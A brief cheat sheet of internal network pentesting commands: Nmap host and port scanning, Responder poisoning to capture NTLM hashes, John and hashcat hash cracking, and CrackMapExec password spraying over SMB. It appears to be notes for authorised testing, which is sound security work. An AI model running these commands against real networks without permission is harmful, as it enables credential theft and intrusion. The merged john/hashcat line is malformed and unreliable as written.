# Internal Network Pentesting
Notes for Internal Network Pentesting 


###  Nmap

```bash
nmap -sn 192.168.1.1/24
```
```bash
nmap -sV -sC -A -p- IP-Address
```

###  Responder

```bash
responder -I eth0 -P  -v
```
- After capturing NTLM Hash (copy the captured hash into .txt format) copy full hash from username to end of the hash.

```bash
john --format=netntlmv2 hash.txt hashcat -m 5600 -a 3 wordlists.txt
```

### CrackMapExec 

```bash
crackmapexec smb "10.0.4.0/24" -u "FirstName.LastName" -p /path/to/password.txt
```

